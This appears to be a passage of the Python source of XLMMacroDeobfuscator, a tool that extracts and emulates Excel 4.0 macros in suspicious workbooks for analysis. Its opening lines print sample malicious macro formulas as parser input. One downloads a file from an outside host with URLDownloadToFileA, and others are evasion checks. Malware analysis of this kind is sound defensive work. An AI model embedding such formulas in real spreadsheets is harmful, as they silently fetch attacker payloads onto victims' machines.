    print(xlm_parser.parse("=IF(GET.WORKSPACE(19),,CLOSE(TRUE))"))
    print(r'\n=OPEN(GET.WORKSPACE(48)&"\WZTEMPLT.XLA")')
    print(xlm_parser.parse(r'=OPEN(GET.WORKSPACE(48)&"\WZTEMPLT.XLA")'))
    print(
        """\n=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)""")
    print(xlm_parser.parse(
        """=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)"""))


_thismodule_dir = os.path.normpath(os.path.abspath(os.path.dirname(__file__)))
_parent_dir = os.path.normpath(os.path.join(_thismodule_dir, '..'))
if _parent_dir not in sys.path:
    sys.path.insert(0, _parent_dir)


def get_file_type(path):
    file_type = None
    with open(path, 'rb') as input_file:
        start_marker = input_file.read(2)
        if start_marker == b'\xD0\xCF':
            file_type = 'xls'
        elif start_marker == b'\x50\x4B':
            file_type = 'xlsm/b'
    if file_type == 'xlsm/b':
        raw_bytes = open(path, 'rb').read()
        if bytes('workbook.bin', 'ascii') in raw_bytes:
            file_type = 'xlsb'
        else:
            file_type = 'xlsm'
    return file_type


def show_cells(excel_doc, sorted_formulas=False):
    macrosheets = excel_doc.get_macrosheets()

    for macrosheet_name in macrosheets:
        # yield 'SHEET: {}, {}'.format(macrosheets[macrosheet_name].name,
        #                                macrosheets[macrosheet_name].type)

        yield macrosheets[macrosheet_name].name, macrosheets[macrosheet_name].type

        if sorted_formulas:
            tmp_formulas = []
            for formula_loc, info in macrosheets[macrosheet_name].cells.items():
                if info.formula is not None:
                    tmp_formulas.append((info, 'EXTRACTED', info.formula, '', info.value))
            tmp_formulas = sorted(tmp_formulas, key=lambda x:(x[0].column,
                                                              int(x[0].row) if EvalResult.is_int(x[0].row) else x[0].row))
            for formula in tmp_formulas:
                yield formula
        else:
            for formula_loc, info in macrosheets[macrosheet_name].cells.items():
                if info.formula is not None:
                    yield info, 'EXTRACTED', info.formula, '', info.value
                    # yield 'CELL:{:10}, {:20}, {}'.format(formula_loc, info.formula, info.value)
        for formula_loc, info in macrosheets[macrosheet_name].cells.items():
            if info.formula is None:
                # yield 'CELL:{:10}, {:20}, {}'.format(formula_loc, str(info.formula), info.value)
                yield info, 'EXTRACTED', str(info.formula), '', info.value,


def uprint(*objects, sep=' ', end='\n', file=sys.stdout, silent_mode=False):
    if silent_mode:
        return

    enc = file.encoding
    if enc == 'UTF-8':
        print(*objects, sep=sep, end=end, file=file)
    else:
        def f(obj): return str(obj).encode(enc, errors='backslashreplace').decode(enc)
        print(*map(f, objects), sep=sep, end=end, file=file)


def get_formula_output(interpretation_result, format_str, with_index=True):
    cell_addr = interpretation_result[0].get_local_address()
    status = interpretation_result[1]
    formula = interpretation_result[2]
    indent = ''.join(['\t'] * interpretation_result[3])
    result = ''
    if format_str is not None and type(format_str) is str:
        result = format_str
        result = result.replace('[[CELL-ADDR]]', '{:10}'.format(cell_addr))
        result = result.replace('[[STATUS]]', '{:20}'.format(status.name))
        if with_index:
            formula = indent + formula
        result = result.replace('[[INT-FORMULA]]', formula)

    return result


def convert_to_json_str(file, defined_names, records, memory=None, files=None):
    file_content = open(file, 'rb').read()
    md5 = hashlib.md5(file_content).hexdigest()
    sha256 = hashlib.sha256(file_content).hexdigest()

    if defined_names:
        for key, val in defined_names.items():
            if isinstance(val, Tree):
                defined_names[key] = XLMInterpreter.convert_ptree_to_str(val)
            elif isinstance(val, Cell):
                defined_names[key] = str(val)

    res = {'file_path': file, 'md5_hash': md5, 'sha256_hash': sha256, 'analysis_timestamp': int(time.time()),
           'format_version': 1, 'analyzed_by': 'XLMMacroDeobfuscator',
           'link': 'https://github.com/DissectMalware/XLMMacroDeobfuscator', 'defined_names': defined_names,
           'records': [], 'memory_records': [], 'files': []}

    for index, i in enumerate(records):
        if len(i) == 4:
            res['records'].append({'index': index,
                                   'sheet': i[0].sheet.name,
                                   'cell_add': i[0].get_local_address(),
                                   'status': str(i[1]),
                                   'formula': i[2]})
        elif len(i) == 5:
            res['records'].append({'index': index,
                                   'sheet': i[0].sheet.name,
                                   'cell_add': i[0].get_local_address(),
                                   'status': str(i[1]),
                                   'formula': i[2],
                                   'value': str(i[4])})
    if memory:
        for mem_rec in memory:
            res['memory_records'].append({
                'base': mem_rec['base'],
                'size': mem_rec['size'],
                'data_base64': bytearray(mem_rec['data']).hex()
            })

    if files:
        for file in files:
            if len(files[file]['file_content']) > 0:
                bytes_str = files[file]['file_content'].encode('utf_8')
                base64_str = base64.b64encode(bytes_str).decode()
                res['files'].append({
                    'path': file,
                    'access': files[file]['file_access'],
                    'content_base64': base64_str
                })

    return res


def try_decrypt(file, password=''):
    is_encrypted = False
    tmp_file_path = None

    try:
        msoffcrypto_obj = msoffcrypto.OfficeFile(open(file, "rb"))

        if msoffcrypto_obj.is_encrypted():
            is_encrypted = True

            temp_file_args = {'prefix': 'decrypt-', 'suffix': os.path.splitext(file)[1], 'text': False}

            tmp_file_handle = None
            try:
                msoffcrypto_obj.load_key(password=password)
                tmp_file_handle, tmp_file_path = mkstemp(**temp_file_args)
                with os.fdopen(tmp_file_handle, 'wb') as tmp_file:
                    msoffcrypto_obj.decrypt(tmp_file)
            except:
                if tmp_file_handle:
                    tmp_file_handle.close()
                    os.remove(tmp_file_path)
                    tmp_file_path = None
    except Exception as exp:
        uprint(str(exp), silent_mode=SILENT)

    return tmp_file_path, is_encrypted


def get_logo():
    return """
          _        _______
|\     /|( \      (       )
( \   / )| (      | () () |
 \ (_) / | |      | || || |
  ) _ (  | |      | |(_)| |
 / ( ) \ | |      | |   | |
( /   \ )| (____/\| )   ( |
|/     \|(_______/|/     \|
   ______   _______  _______  ______   _______           _______  _______  _______ _________ _______  _______
  (  __  \ (  ____ \(  ___  )(  ___ \ (  ____ \|\     /|(  ____ \(  ____ \(  ___  )\__   __/(  ___  )(  ____ )
  | (  \  )| (    \/| (   ) || (   ) )| (    \/| )   ( || (    \/| (    \/| (   ) |   ) (   | (   ) || (    )|
  | |   ) || (__    | |   | || (__/ / | (__    | |   | || (_____ | |      | (___) |   | |   | |   | || (____)|
  | |   | ||  __)   | |   | ||  __ (  |  __)   | |   | |(_____  )| |      |  ___  |   | |   | |   | ||     __)
  | |   ) || (      | |   | || (  \ \ | (      | |   | |      ) || |      | (   ) |   | |   | |   | || (\ (
  | (__/  )| (____/\| (___) || )___) )| )      | (___) |/\____) || (____/\| )   ( |   | |   | (___) || ) \ \__
  (______/ (_______/(_______)|/ \___/ |/       (_______)\_______)(_______/|/     \|   )_(   (_______)|/   \__/

    """


def process_file(**kwargs):
    """ Example of kwargs when using as library
    {
        'file': '/tmp/8a6e4c10c30b773147d0d7c8307d88f1cf242cb01a9747bfec0319befdc1fcaf',
        'noninteractive': True,
        'extract_only': False,
        'with_ms_excel': False,
        'start_with_shell': False,
        'return_deobfuscated': True,
        'day': 0,
        'output_formula_format': 'CELL:[[CELL-ADDR]], [[STATUS]], [[INT-FORMULA]]',
        'start_point': '',
        'timeout': 30
    }
    """

    global SILENT

    if kwargs.get("silent"):
        SILENT = kwargs.get("silent")

    deobfuscated = list()
    interpreted_lines = list()
    file_path = os.path.abspath(kwargs.get('file'))
    file_type = get_file_type(file_path)
    password = kwargs.get('password', 'VelvetSweatshop')

    uprint('File: {}\n'.format(file_path), silent_mode=SILENT)

    if file_type is None:
        raise Exception('Input file type is not supported.')

    decrypted_file_path = is_encrypted = None

    decrypted_file_path, is_encrypted = try_decrypt(file_path, password)
    if is_encrypted:
        uprint('Encrypted {} file'.format(file_type), silent_mode=SILENT)
        if decrypted_file_path is None:
            raise Exception(
                'Failed to decrypt {}\nUse --password switch to provide the correct password'.format(file_path))
        file_path = decrypted_file_path
    else:
        uprint('Unencrypted {} file\n'.format(file_type), silent_mode=SILENT)

    try:
        start = time.time()
        excel_doc = None

        uprint('[Loading Cells]', silent_mode=SILENT)
        if file_type == 'xls':
            if kwargs.get("no_ms_excel", False):
                print('--with-ms-excel switch is now deprecated (by default, MS-Excel is not used)\n'
                      'If you want to use MS-Excel, use --with-ms-excel')

            if not kwargs.get("with_ms_excel", False):
                excel_doc = XLSWrapper2(file_path) if not SILENT else XLSWrapper2(file_path, logfile=None)
            else:
                try:
                    excel_doc = XLSWrapper(file_path)

                except Exception as exp:
                    print("Error: MS Excel is not installed, now xlrd2 library will be used insteads\n" +
                          "(Use --no-ms-excel switch if you do not have/want to use MS Excel)")
                    excel_doc = XLSWrapper2(file_path)
        elif file_type == 'xlsm':
            excel_doc = XLSMWrapper(file_path)
        elif file_type == 'xlsb':
            excel_doc = XLSBWrapper(file_path)
        if excel_doc is None:
            raise Exception('Input file type is not supported.')

        auto_open_labels = excel_doc.get_defined_name('auto_open', full_match=False)
        for label in auto_open_labels:
            uprint('auto_open: {}->{}'.format(label[0], label[1]), silent_mode=SILENT)

        auto_close_labels = excel_doc.get_defined_name('auto_close', full_match=False)
        for label in auto_close_labels:
            uprint('auto_close: {}->{}'.format(label[0], label[1]), silent_mode=SILENT)

        if kwargs.get("defined_names"):
            uprint("[Defined Names]", silent_mode=SILENT)
            defined_names = excel_doc.get_defined_names()
            for name in defined_names:
                if not kwargs.get("return_deobfuscated"):
                    uprint("{} --> {}".format(name, defined_names[name]), silent_mode=SILENT)

        if kwargs.get("extract_only"):
            sorted = False
            if kwargs.get("sort_formulas"):
                sorted = True
            if kwargs.get("export_json"):
                records = []
                for i in show_cells(excel_doc, sorted):
                    if len(i) == 5:
                        records.append(i)

                uprint('[Dumping to Json]', silent_mode=SILENT)
                res = convert_to_json_str(file_path, excel_doc.get_defined_names(), records)

                try:
                    output_file_path = kwargs.get("export_json")
                    with open(output_file_path, 'w', encoding='utf_8') as output_file:
                        output_file.write(json.dumps(res, indent=4))
                        uprint('Result is dumped into {}'.format(output_file_path), silent_mode=SILENT)
                except Exception as exp:
                    print('Error: unable to dump the result into the specified file\n{}'.format(str(exp)))
                uprint('[End of Dumping]', silent_mode=SILENT)

                if not kwargs.get("return_deobfuscated"):
                    return res
            else:
                res = []
                output_format = kwargs.get("extract_formula_format", 'CELL:[[CELL-ADDR]], [[CELL-FORMULA]], [[CELL-VALUE]]')
                for i in show_cells(excel_doc, sorted):
                    rec_str = ''
                    if len(i) == 2:
                        rec_str = 'SHEET: {}, {}'.format(i[0], i[1])
                    elif len(i) == 5:
                        if output_format is not None:
                            rec_str = output_format
                            rec_str = rec_str.replace('[[CELL-ADDR]]', i[0].get_local_address())
                            rec_str = rec_str.replace('[[CELL-FORMULA]]', i[2])
                            rec_str = rec_str.replace('[[CELL-VALUE]]', str(i[4]))
                        else:
                            rec_str = 'CELL:{:10}, {:20}, {}'.format(i[0].get_local_address(), i[2], i[4])
                    if rec_str:
                        if not kwargs.get("return_deobfuscated"):
                            uprint(rec_str, silent_mode=SILENT)
                        res.append(rec_str)


                if kwargs.get("return_deobfuscated"):
                    return res

        else:
            uprint('[Starting Deobfuscation]', silent_mode=SILENT)
            interpreter = XLMInterpreter(excel_doc, output_level=kwargs.get("output_level", 0))
            if kwargs.get("day", 0) > 0:
                interpreter.day_of_month = kwargs.get("day")

            interactive = not kwargs.get("noninteractive")

            if kwargs.get("start_with_shell"):
                starting_points = interpreter.xlm_wrapper.get_defined_name('auto_open', full_match=False)
                if len(starting_points) == 0:
                    if len(kwargs.get("start_point")) > 0:
                        starting_points = [('auto_open', kwargs.get("start_point"))]
                    elif interactive:
                        print('There is no entry point, please specify a cell address to start')
                        print('Example: Sheet1!A1')
                        auto_open_labels = [('auto_open', input().strip())]
                sheet_name, col, row = Cell.parse_cell_addr(starting_points[0][1])
                macros = interpreter.xlm_wrapper.get_macrosheets()
                if sheet_name in macros:
                    current_cell = interpreter.get_formula_cell(macros[sheet_name], col, row)
                    interpreter.interactive_shell(current_cell, "")

            output_format = kwargs.get("output_formula_format", 'CELL:[[CELL-ADDR]], [[STATUS]], [[INT-FORMULA]]')
            start_point = kwargs.get("start_point", '')

            timeout = 0
            if kwargs.get("timeout"):
                timeout = kwargs.get("timeout")

            for step in interpreter.deobfuscate_macro(interactive, start_point, timeout=timeout, silent_mode=SILENT):
                if kwargs.get("return_deobfuscated"):
                    deobfuscated.append(
                        get_formula_output(step, output_format, not kwargs.get("no_indent")))
                elif kwargs.get("export_json"):
                    interpreted_lines.append(step)
                else:
                    uprint(get_formula_output(step, output_format, not kwargs.get("no_indent")), silent_mode=SILENT)
            if interpreter.day_of_month is not None:
                uprint('[Day of Month] {}'.format(interpreter.day_of_month), silent_mode=SILENT)

            if not kwargs.get("export_json") and not kwargs.get("return_deobfuscated"):
                for mem_record in interpreter._memory:
                    uprint('Memory: base {}, size {}\n{}\n'.format(mem_record['base'],
                                                                   mem_record['size'],
                                                                   bytearray(mem_record['data']).hex()),
                           silent_mode=SILENT)
                uprint('\nFiles:\n')
                for file in interpreter._files:
                    if len(interpreter._files[file]['file_content']) > 0:
                        uprint('Files: path {}, access {}\n{}\n'.format(file,
                                                                        interpreter._files[file]['file_access'],
                                                                        interpreter._files[file]['file_content']),
                               silent_mode=SILENT)

            uprint('[END of Deobfuscation]', silent_mode=SILENT)

            if kwargs.get("export_json"):
                uprint('[Dumping Json]', silent_mode=SILENT)
                res = convert_to_json_str(file_path, excel_doc.get_defined_names(), interpreted_lines,
                                          interpreter._memory, interpreter._files)
                try:
                    output_file_path = kwargs.get("export_json")
                    with open(output_file_path, 'w', encoding='utf_8') as output_file:
                        output_file.write(json.dumps(res, indent=4))
                        uprint('Result is dumped into {}'.format(output_file_path), silent_mode=SILENT)
                except Exception as exp:
                    print('Error: unable to dump the result into the specified file\n{}'.format(str(exp)))

                uprint('[End of Dumping]', silent_mode=SILENT)
                if kwargs.get("return_deobfuscated"):
                    return res

        uprint('time elapsed: ' + str(time.time() - start), silent_mode=SILENT)
    finally:
        if HAS_XLSWrapper and type(excel_doc) is XLSWrapper:
            excel_doc._excel.Application.DisplayAlerts = False
            excel_doc._excel.Application.Quit()

    if kwargs.get("return_deobfuscated"):
        return deobfuscated


def main():
    print(get_logo())
    print('XLMMacroDeobfuscator(v{}) - {}\n'.format(__version__,
                                                    "https://github.com/DissectMalware/XLMMacroDeobfuscator"))

    config_parser = argparse.ArgumentParser(add_help=False)

    config_parser.add_argument("-c", "--config-file",
                               help="Specify a config file (must be a valid JSON file)", metavar="FILE_PATH")
    args, remaining_argv = config_parser.parse_known_args()

    defaults = {}

    if args.config_file:
        try:
            with open(args.config_file, 'r', encoding='utf_8') as config_file:
                defaults = json.load(config_file)
                defaults = {x.replace('-', '_'): y for x, y in defaults.items()}
        except json.decoder.JSONDecodeError as json_exp:
            uprint(
                'Config file cannot be parsed (must be a valid json file, '
                'validate your file with an online JSON validator)',
                silent_mode=SILENT)

    arg_parser = argparse.ArgumentParser(parents=[config_parser])

    arg_parser.add_argument("-f", "--file", type=str, action='store',
                            help="The path of a XLSM file", metavar=('FILE_PATH'))
    arg_parser.add_argument("-n", "--noninteractive", default=False, action='store_true',
                            help="Disable interactive shell")
    arg_parser.add_argument("-x", "--extract-only", default=False, action='store_true',
                            help="Only extract cells without any emulation")
    arg_parser.add_argument("--sort-formulas", default=False, action='store_true',
                            help="Sort extracted formulas based on their cell address (requires -x)")
    arg_parser.add_argument("--defined-names", default=False, action='store_true',
                            help="Extract all defined names")
    arg_parser.add_argument("-2", "--no-ms-excel", default=False, action='store_true',
                            help="[Deprecated] Do not use MS Excel to process XLS files")
    arg_parser.add_argument("--with-ms-excel", default=False, action='store_true',
                            help="Use MS Excel to process XLS files")
    arg_parser.add_argument("-s", "--start-with-shell", default=False, action='store_true',
                            help="Open an XLM shell before interpreting the macros in the input")
    arg_parser.add_argument("-d", "--day", type=int, default=-1, action='store',
                            help="Specify the day of month", )
    arg_parser.add_argument("--output-formula-format", type=str,
                            default="CELL:[[CELL-ADDR]], [[STATUS]], [[INT-FORMULA]]",
                            action='store',
                            help="Specify the format for output formulas "
                                 "([[CELL-ADDR]], [[INT-FORMULA]], and [[STATUS]]", )
    arg_parser.add_argument("--extract-formula-format", type=str,
                            default="CELL:[[CELL-ADDR]], [[CELL-FORMULA]], [[CELL-VALUE]]",
                            action='store',
                            help="Specify the format for extracted formulas "
                                 "([[CELL-ADDR]], [[CELL-FORMULA]], and [[CELL-VALUE]]", )
    arg_parser.add_argument("--no-indent", default=False, action='store_true',
                            help="Do not show indent before formulas")
    arg_parser.add_argument("--silent", default=False, action='store_true',
                            help="Do not print output")
    arg_parser.add_argument("--export-json", type=str, action='store',
                            help="Export the output to JSON", metavar=('FILE_PATH'))
    arg_parser.add_argument("--start-point", type=str, default="", action='store',
                            help="Start interpretation from a specific cell address", metavar=('CELL_ADDR'))
    arg_parser.add_argument("-p", "--password", type=str, action='store', default='',
                            help="Password to decrypt the protected document")
    arg_parser.add_argument("-o", "--output-level", type=int, action='store', default=0,
                            help="Set the level of details to be shown "
                                 "(0:all commands, 1: commands no jump "
                                 "2:important commands 3:strings in important commands).")
    arg_parser.add_argument("--timeout", type=int, action='store', default=0, metavar=('N'),
                            help="stop emulation after N seconds"
                                 " (0: not interruption "
                                 "N>0: stop emulation after N seconds)")

    arg_parser.set_defaults(**defaults)

    args = arg_parser.parse_args(remaining_argv)

    if not args.file:
        print('Error: --file is missing\n')
        arg_parser.print_help()
    elif not os.path.exists(args.file):
        print('Error: input file does not exist')
    else:
        try:
            # Convert args to kwarg dict
            try:
                process_file(**vars(args))
            except Exception as exp:
                exc_type, exc_obj, traceback = sys.exc_info()
                frame = traceback.tb_frame
                lineno = traceback.tb_lineno
                filename = frame.f_code.co_filename
                linecache.checkcache(filename)
                line = linecache.getline(filename, lineno, frame.f_globals)
                print('Error [{}:{} {}]: {}'.format(os.path.basename(filename),
                                                    lineno,
                                                    line.strip(),
                                                    exc_obj))

        except Exception:
            pass


if __name__ == '__main__':
    main()
